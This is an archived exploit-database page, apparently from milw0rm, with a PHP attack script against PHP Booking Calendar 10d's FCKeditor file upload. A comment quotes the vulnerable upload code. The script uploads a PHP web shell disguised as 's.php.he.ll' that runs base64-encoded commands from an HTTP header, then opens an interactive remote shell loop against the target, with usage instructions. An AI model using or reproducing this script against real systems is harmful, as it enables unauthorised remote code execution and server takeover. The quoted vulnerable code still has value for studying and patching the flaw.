<html><head><title>PHP Booking Calendar 10 d (fckeditor) Arbitrary File Upload Exploit</title></head><pre>&lt;?php
/*
 --------------------------------------------------------------
 PHP Booking Calendar 10 d (fckeditor) Arbitrary File Upload Exploit
 --------------------------------------------------------------
 
  Special thnx for : Egix
 [-] vulnerable code in /[path]/fckeditor/editor/filemanager/upload/php/upload.php
 
 41. // Get the posted file.
 42. $oFile = $_FILES['NewFile'] ;
 43.
 44. // Get the uploaded file name and extension.
 45. $sFileName = $oFile['name'] ;
 46. $sOriginalFileName = $sFileName ;
 47. $sExtension = substr( $sFileName, ( strrpos($sFileName, '.') + 1 ) ) ;
 48. $sExtension = strtolower( $sExtension ) ;
 49.
 50. // The the file type (from the QueryString, by default 'File').
 51. $sType = isset( $_GET['Type'] ) ? $_GET['Type'] : 'File' ;
 52.
 53. // Check if it is an allowed type.
 54. if ( !in_array( $sType, array('File','Image','Flash','Media') ) )
 55.     SendResults( 1, '', '', 'Invalid type specified' ) ;
 56.
 57. // Get the allowed and denied extensions arrays.
 58. $arAllowed = $Config['AllowedExtensions'][$sType] ;
 59. $arDenied = $Config['DeniedExtensions'][$sType] ;
 60.
 61. // Check if it is an allowed extension.
 62. if ( ( count($arAllowed) &gt; 0 &amp;&amp; !in_array( $sExtension, $arAllowed ) ) || ( count($arDenied) &gt; 0 &amp;&amp; in_array( $sExtension, $arDenied ) ) )
 63.  SendResults( '202' ) ;
 64.
 65. $sErrorNumber = '0' ;
 66. $sFileUrl  = '' ;
 67.
 68. // Initializes the counter used to rename the file, if another one with the same name already exists.
 69. $iCounter = 0 ;
 70.
 71. // The the target directory.
 72. if ( isset( $Config['UserFilesAbsolutePath'] ) )
 73.  $sServerDir = $Config['UserFilesAbsolutePath'] ;
 74. else
 75.  //$sServerDir = GetRootPath() . $Config[&quot;UserFilesPath&quot;] ;
 76.  $sServerDir = $Config[&quot;UserFilesPath&quot;] ;
 77.
 78. while ( true )
 79. {
 80.  // Compose the file path.
 81.  $sFilePath = $sServerDir . $sFileName ;
 82.
 83.  // If a file with that name already exists.
 84.  if ( is_file( $sFilePath ) )
 85.  {
 86.   $iCounter++ ;
 87.   $sFileName = RemoveExtension( $sOriginalFileName ) . '(' . $iCounter . ').' . $sExtension ;
 88.   $sErrorNumber = '201' ;
 89.  }
 90.  else
 91.  {
 92.   move_uploaded_file( $oFile['tmp_name'], $sFilePath ) ;
 93.
 94.   if ( is_file( $sFilePath ) )
 95.   {
 96.    $oldumask = umask(0) ;
 97.    chmod( $sFilePath, 0777 ) ;
 98.    umask( $oldumask ) ;
 99.   }
 100.  
 101.   $sFileUrl = $Config[&quot;UserFilesPath&quot;] . $sFileName ;
 102.
 103.   break ;
 
 with a default configuration of this script, an attacker might be able to upload arbitrary files containing malicious PHP code
*/
error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);
function http_send($host, $packet)
{
 $sock = fsockopen($host, 80);
 while (!$sock)
 {
  print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
  $sock = fsockopen($host, 80);
 }
 fputs($sock, $packet);
 while (!feof($sock)) $resp .= fread($sock, 1024);
 fclose($sock);
 return $resp;
}
print &quot;\n+------------------------------------------------------------+&quot;;
print &quot;\n|PHP Booking Calendar 10d Arbitrary File Upload Exploit by Stack |&quot;;
print &quot;\n+------------------------------------------------------------+\n&quot;;
if ($argc &lt; 2)
{
 print &quot;\nUsage......: php $argv[0] host path&quot;;
 print &quot;\nExample....: php $argv[0] localhost /booking_calendar/\n&quot;;
 die();
}
$host = $argv[1];
$path = $argv[2];
$data  = &quot;--12345\r\n&quot;;
$data .= &quot;Content-Disposition: form-data; name=\&quot;NewFile\&quot;; filename=\&quot;s.php.he.ll\&quot;\r\n&quot;;
$data .= &quot;Content-Type: application/octet-stream\r\n\r\n&quot;;
$data .= &quot;&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?&gt;\n&quot;;
$data .= &quot;--12345--\r\n&quot;;
$packet  = &quot;POST {$path}/fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet .= &quot;Content-Type: multipart/form-data; boundary=12345\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;
$packet .= $data;
preg_match(&quot;/OnUploadCompleted\((.*),\&quot;(.*)\&quot;,\&quot;(.*)\&quot;,/i&quot;, http_send($host, $packet), $html);
if (!in_array(intval($html[1]), array(0, 201))) die(&quot;\n[-] Upload failed! (Error {$html[1]})\n&quot;);
else print &quot;\n[-] Shell uploaded to {$html[2]}...starting it!\n&quot;;
define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));
while(1)
{
 print &quot;\nstack-shell# &quot;;
 $cmd = trim(fgets(STDIN));
 if ($cmd != &quot;exit&quot;)
 {
  $packet = &quot;GET {$path}datacenter/media/{$html[3]} HTTP/1.0\r\n&quot;;
  $packet.= &quot;Host: {$host}\r\n&quot;;
  $packet.= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
  $packet.= &quot;Connection: close\r\n\r\n&quot;;
  $output = http_send($host, $packet);
  if (eregi(&quot;print&quot;, $output) || !eregi(&quot;_code_&quot;, $output)) die(&quot;\n[-] Exploit failed...\n&quot;);
  $shell = explode(&quot;_code_&quot;, $output);
  print &quot;\n{$shell[1]}&quot;;
 }
 else break;
}
?&gt;

# milw0rm.com [2008-05-29]</pre></html>